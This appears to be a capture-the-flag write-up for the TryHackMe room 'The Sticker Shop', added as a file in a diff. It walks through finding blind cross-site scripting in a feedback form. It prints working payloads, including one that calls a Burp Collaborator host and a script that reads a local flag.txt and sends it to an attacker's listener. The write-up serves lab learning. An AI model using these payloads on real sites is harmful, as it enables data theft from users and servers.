@@ -1,0 +1,62 @@
+TryHackMe: The Sticker Shop
+
+The website consists of two pages -
+
+Home
+Displays a simple interface with cat stickers etc.
+No vulnerabilities were found here.
+
+Submit Feedback PagePermalink
+Contains a feedback form with a textarea for users to submit their comments.
+The form sends a POST request to /submit_feedback.
+
+Initial ObservationsPermalink
+The feedback form allows user-supplied input, which could be a potential injection point for attacks like Cross-Site Scripting (XSS).
+
+The response to a normal feedback submission is: Thanks for your feedback! It will be evaluated shortly by our staff.
+
+Try Normal Paylaod first :
+
+'"><script>alert(1)</script>
+Web 80 Index
+
+Blind XSS DiscoveryPermalink
+used Burp-collaborator to check if the Blind XSS is exsist or not
+Payload used :
+'"><script src=https://xyzh5f7ugxnj7919kl6eqcaohfn6bxzm.oastify.com></script>`
+Web 80 Index Web 80 Index
+
+After submitting the payload in the feedback form, I observed a DNS interaction logged in Burp Collaborator, confirming the execution of the payload.
+
+
+
+
+
+
+Exploitation Process
+1. Setting Up the Listener
+
+To capture the exfiltrated data, an HTTP server was set up on the attacker’s machine:
+
+python3 -m http.server 8000
+This server listens for incoming requests, which will contain the sensitive data exfiltrated from the target.
+
+2. Crafting the Exploit Payload
+
+The goal of the exploit was twofold:
+
+Retrieve the flag located at http://127.0.0.1:8080/flag.txt.
+Exfiltrate the data to the attacker’s HTTP server.
+The crafted payload was as follows:
+
+'"><script>
+  fetch('http://127.0.0.1:8080/flag.txt')
+    .then(response => response.text())
+    .then(data => {
+      fetch('http://<YOUR-IP-ADDRESS>:8000/?flag=' + encodeURIComponent(data));
+    });
+</script>
+The payload first fetches the flag from the target server, encodes it to ensure safe transmission, and sends it to the attacker’s server via a GET request.
+
+
+The flag.txt is base64 encoded. To decode it, you can use the terminal or visit dencode.com, paste your encoded string, and retrieve the flag.
